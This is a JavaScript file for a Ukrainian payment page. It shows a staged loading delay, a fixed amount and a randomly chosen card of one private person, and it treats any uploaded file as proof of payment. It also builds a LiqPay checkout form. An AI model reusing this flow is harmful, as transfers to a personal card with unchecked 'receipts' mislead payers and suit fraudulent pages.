document.addEventListener("DOMContentLoaded", function () {
    const loadingScreen = document.getElementById("loadingScreen");
    const paymentForm = document.getElementById("paymentForm");
    const paymentSuccessForm = document.getElementById("paymentSuccessForm");

    setTimeout(() => {
        loadingScreen.style.visibility = "hidden";
        paymentForm.style.display = "block";
    }, 3000);

    const selectedBank = localStorage.getItem("selectedBank");
    const selectedAmount = 3000;
    const cardDetails = [
        { cardNumber: '1234 5678 9012 3456', fullName: 'Гураль Юлія' },
        { cardNumber: '9876 5432 1098 7654', fullName: 'Гураль Юлія' },
        { cardNumber: '1122 3344 5566 7788', fullName: 'Гураль Юлія' },
        { cardNumber: '2233 4455 6677 8899', fullName: 'Гураль Юлія' }
    ];
    const randomIndex = Math.floor(Math.random() * cardDetails.length);
    const selectedCard = cardDetails[randomIndex];
    if (selectedBank) {
        document.getElementById("selectedBank").textContent = `Оплата здійснюється через: ${selectedBank}`;
    }
    document.getElementById("selectedAmount").textContent = `Сума: ${selectedAmount} грн`;
    document.getElementById("cardNumber").textContent = `Номер картки: ${selectedCard.cardNumber}`;
    document.getElementById("fullName").textContent = `ПІБ отримувача: ${selectedCard.fullName}`;

    document.getElementById("receipt").addEventListener("change", function(event) {
        const file = event.target.files[0];
        if (file) {
            paymentSuccessForm.style.display = "block";
            paymentForm.style.display = "none";
        }
    });
});
document.addEventListener("DOMContentLoaded", async function () {
    const response = await fetch("/generate-payment/");
    const data = await response.json();

    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://www.liqpay.ua/api/3/checkout";

    const inputData = document.createElement("input");
    inputData.type = "hidden";
    inputData.name = "data";
    inputData.value = data.data;

    const inputSignature = document.createElement("input");
    inputSignature.type = "hidden";
    inputSignature.name = "signature";
    inputSignature.value = data.signature;

    const button = document.createElement("button");
button.type = "submit";
button.textContent = "Оплатити через LiqPay";

button.style.backgroundColor = "#16325B";
button.style.color = "white";
button.style.fontSize = "1.2rem";
button.style.fontWeight = "bold";
button.style.padding = "12px 20px";
button.style.border = "none";
button.style.borderRadius = "8px";
button.style.cursor = "pointer";
button.style.transition = "background 0.3s ease-in-out, transform 0.2s";
button.style.boxShadow = "0 4px 8px rgba(0, 123, 255, 0.3)";

button.onmouseover = function () {
    button.style.backgroundColor = "#0056b3";
    button.style.transform = "scale(1.05)";
    button.style.boxShadow = "0 6px 12px rgba(0, 86, 179, 0.4)";
};

button.onmouseout = function () {
    button.style.backgroundColor = "#007bff";
    button.style.transform = "scale(1)";
    button.style.boxShadow = "0 4px 8px rgba(0, 123, 255, 0.3)";
};

button.onmousedown = function () {
    button.style.transform = "scale(0.98)";
    button.style.boxShadow = "0 2px 4px rgba(0, 86, 179, 0.3)";
};

button.onmouseup = function () {
    button.style.transform = "scale(1)";
    button.style.boxShadow = "0 6px 12px rgba(0, 86, 179, 0.4)";
};

document.body.appendChild(button);

    form.appendChild(inputData);
    form.appendChild(inputSignature);
    form.appendChild(button);
    document.getElementById("paymentForm").appendChild(form);
});